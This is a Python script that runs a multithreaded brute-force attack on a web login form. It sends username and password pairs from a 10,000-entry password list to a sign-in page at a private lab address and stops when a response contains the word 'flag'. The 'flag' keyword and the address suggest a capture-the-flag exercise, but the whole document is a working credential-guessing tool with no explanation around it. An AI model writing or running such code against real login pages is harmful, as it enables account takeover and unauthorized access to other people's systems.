import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_URL = "http://192.168.56.102/index.php?page=signin"

SUCCESS_KEYWORD = "flag"
USERNAMES = ["webmaster", "Webmaster"]
PASSWORD_FILE = "10_million_password_list_top_10000.txt"

THREADS = 20

def load_passwords():
    """Load password list from file"""
    try:
        with open(PASSWORD_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ Password file not found: {PASSWORD_FILE}")
        exit()


def try_login(username, password):
    """Attempt a single login request. Returns credentials if successful."""

    try:
        res = requests.post(TARGET_URL, params={
			"page": "signin",
			"username": username,
			"password": password,
			"Login": "Login"
		})
    except:
        return None

    response = res.text.lower();
    if SUCCESS_KEYWORD.lower() in response:
        print(f"RESPONSE = ", response);
        return (username, password)

    return None


def brute_force_login():
    passwords = load_passwords()

    print(f"🚀 Starting multithreaded brute force with {THREADS} threads...")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:

        futures = []

        # Submit all combinations to the thread pool
        for username in USERNAMES:
            for password in passwords:
                futures.append(
                    executor.submit(try_login, username, password)
                )

        # Process results as tasks complete
        for future in as_completed(futures):
            result = future.result()

            if result:
                username, password = result
                print("\n🔥 VALID CREDENTIALS FOUND!")
                print(f"Username: {username}")
                print(f"Password: {password}")
                
                executor.shutdown(cancel_futures=True)
                return

    print("\n❌ No valid credentials found.")


if __name__ == "__main__":
    brute_force_login()
